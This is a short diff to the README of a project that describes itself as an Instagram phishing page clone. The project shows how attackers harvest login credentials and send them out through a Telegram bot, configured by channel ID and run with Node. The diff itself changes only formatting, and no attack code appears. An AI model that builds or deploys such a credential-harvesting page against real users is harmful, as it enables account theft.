@@ -1,4 +1,4 @@
-# 📸 Instagram Phishing Demo 2025
+#  Instagram Phishing Demo 2025
 
 This project is a **sample Instagram phishing page clone**  It demonstrates how attackers might design phishing pages and exfiltrate user credentials via Telegram bots.
 
@@ -60,6 +60,7 @@ TELEGRAM_CHANNEL_ID=@yourchannel_or_chatid
 ```bash
 node index.js
 ```
+
 
 Access it at http://localhost:3000.
 
